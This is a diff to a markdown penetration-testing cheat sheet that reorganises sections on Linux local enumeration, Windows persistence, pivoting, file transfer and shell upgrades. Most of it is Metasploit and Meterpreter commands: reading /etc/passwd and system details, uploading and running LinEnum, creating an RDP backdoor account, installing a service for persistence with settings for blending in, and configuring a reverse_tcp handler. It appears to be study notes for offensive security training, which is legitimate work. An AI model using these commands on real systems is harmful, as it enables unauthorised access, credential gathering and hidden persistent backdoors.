@@ -931,6 +931,98 @@ cat jaws-enum.txt
 
 ### Linux
 [<< Index](#Index)
+#### Enumerating System Information
+```
+meterpreter > sysinfo
+meterpreter > getenv PATH
+
+hostname
+cat /etc/issue && cat /etc/*release
+uname -a
+uname -r
+env
+lscpu
+free -h
+df -h
+lsblk
+dpkg -l
+cat /etc/shells
+```
+
+#### Enumerating Users & Groups
+```
+meterpreter > getuid
+
+id
+cat /etc/passwd
+ls -l /home
+groups
+groups <username>
+who
+w
+last
+lastlog
+```
+- `uid=0` is root.
+
+#### Enumerating Network Information
+```
+meterpreter > ifconfig
+meterpreter > netstat
+meterpreter > route
+meterpreter > arp
+
+ip a s
+arp -a
+cat /etc/networks
+cat /etc/hostname
+cat /etc/hosts
+cat /etc/resolv.conf
+```
+
+#### Enumerating Processes & Cron Jobs
+```
+meterpreter > ps
+meterpreter > ps -S <process>
+meterpreter > pgrep <process>
+
+ps --help all
+ps
+ps aux
+ps aux | grep root
+ps aux | grep <process>
+ps aux | grep -i <keyword>
+top
+crontab -l
+crontab -l -u <username>
+ls -al /etc/cron*
+cat /etc/crontab
+cat /etc/cron*
+```
+
+#### Automating Linux Local Enumeration 
+```
+use post/linux/gather/enum_configs
+use post/linux/gather/enum_network
+use post/linux/gather/enum_system  
+use post/linux/gather/checkvm
+
+cat /root/.msf4/loot/<filename>.txt
+```
+- Post-exploitation modules need to `set SESSION <session_id>`.
+
+#### LinEnum
+```
+meterpreter > cd /tmp
+meterpreter > upload /root/linenum.sh
+meterpreter > ls
+meterpreter > shell
+
+/bin/bash -i
+chmod +x linenum.sh
+./linenum.sh
+```
+- https://github.com/rebootuser/LinEnum
 
 ## Privilege Escalation
 [<< Index](#Index)
@@ -974,7 +1066,32 @@ meterpreter > getsystem
 
 ## Maintaining Persistent Access
 ### Windows
+#### RDP
+[<< Index](#Index)
+```
+meterpreter > run getgui -e -u <username> -p <password>
 
+xfreerdp /u:<username> /p:<password> /v:<ip>
+```
+- Meterpreter script to create a RDP backdoor.
+- Password must meet complexity requirements.
+
+#### Services
+[<< Index](#Index)
+```
+use exploit/windows/local/persistence_service
+set SESSION <session_id>
+```
+- Admin or system privileges required.
+- `RETRY_TIME` 5 seconds.
+- Other settings more for blending in e.g. `SERVICE_NAME`.
+
+```
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ip>
+set LPORT <port>
+```
 
 ### Linux
 #### Cron Jobs
@@ -1038,114 +1155,8 @@ meterpreter > keyscan_stop
 meterpreter > migrate -N winlogon.exe
 ```
 
-
-
-
-
-
-
-
-
-
-
-## Linux Local Enumeration
-### Enumerating System Information
-```
-meterpreter > sysinfo
-meterpreter > getenv PATH
-
-hostname
-cat /etc/issue && cat /etc/*release
-uname -a
-uname -r
-env
-lscpu
-free -h
-df -h
-lsblk
-dpkg -l
-cat /etc/shells
-```
-
-### Enumerating Users & Groups
-```
-meterpreter > getuid
-
-id
-cat /etc/passwd
-ls -l /home
-groups
-groups <username>
-who
-w
-last
-lastlog
-```
-- `uid=0` is root.
-
-### Enumerating Network Information
-```
-meterpreter > ifconfig
-meterpreter > netstat
-meterpreter > route
-meterpreter > arp
-
-ip a s
-arp -a
-cat /etc/networks
-cat /etc/hostname
-cat /etc/hosts
-cat /etc/resolv.conf
-```
-
-### Enumerating Processes & Cron Jobs
-```
-meterpreter > ps
-meterpreter > ps -S <process>
-meterpreter > pgrep <process>
-
-ps --help all
-ps
-ps aux
-ps aux | grep root
-ps aux | grep <process>
-ps aux | grep -i <keyword>
-top
-crontab -l
-crontab -l -u <username>
-ls -al /etc/cron*
-cat /etc/crontab
-cat /etc/cron*
-```
-
-### Automating Linux Local Enumeration 
-```
-use post/linux/gather/enum_configs
-use post/linux/gather/enum_network
-use post/linux/gather/enum_system  
-use post/linux/gather/checkvm
-
-cat /root/.msf4/loot/<filename>.txt
-```
-- Post-exploitation modules need to `set SESSION <session_id>`.
-
-### LinEnum
-```
-meterpreter > cd /tmp
-meterpreter > upload /root/linenum.sh
-meterpreter > ls
-meterpreter > shell
-
-/bin/bash -i
-chmod +x linenum.sh
-./linenum.sh
-```
-- https://github.com/rebootuser/LinEnum
-
-
-
-
 ## Pivoting
+[<< Index](#Index)
 ```
 meterpreter > ipconfig
 meterpreter > arp
@@ -1180,7 +1191,7 @@ meterpreter > upload /root/tools/static-binaries/nmap /tmp/nmap
 ```
 
 ## Transfer Files
-- Set Up A Web Server With Python
+[<< Index](#Index)
 ```
 python -m SimpleHTTPServer 80
 python3 -m http.server 80
@@ -1189,7 +1200,9 @@ python3 -m http.server 80
 - Linux: `wget http://<ip>/<filename>`
 
 ## Upgrade Shells
-- Non-interactive to interactive
+[<< Index](#Index)
+### Non-interactive to interactive
+[<< Index](#Index)
 ```
 cat /etc/shells
 /bin/bash -i
@@ -1217,7 +1230,8 @@ export TERM=xterm-256color
 stty rows <rows> columns <columns>
 ```
 
-- Non-meterpreter to meterpreter
+### Non-meterpreter to meterpreter
+[<< Index](#Index)
 ```
 sessions -u <session_id>
 ```
@@ -1228,31 +1242,7 @@ set SESSION <session_id>
 set WIN_TRANSFER VBS
 ```
 
-## Windows Persistence Via RDP
-```
-meterpreter > run getgui -e -u <username> -p <password>
-
-xfreerdp /u:<username> /p:<password> /v:<ip>
-```
-- Meterpreter script to create a RDP backdoor.
-- Password must meet complexity requirements.
-
-## Windows Persistence Via Services
-```
-use exploit/windows/local/persistence_service
-set SESSION <session_id>
-```
-- Admin or system privileges required.
-- `RETRY_TIME` 5 seconds.
-- Other settings more for blending in e.g. `SERVICE_NAME`.
-
-```
-use multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST <ip>
-set LPORT <port>
-```
-
 ## Working Directories
+[<< Index](#Index)
 - Windows: `C:\Temp`
 - Linux: `/tmp`
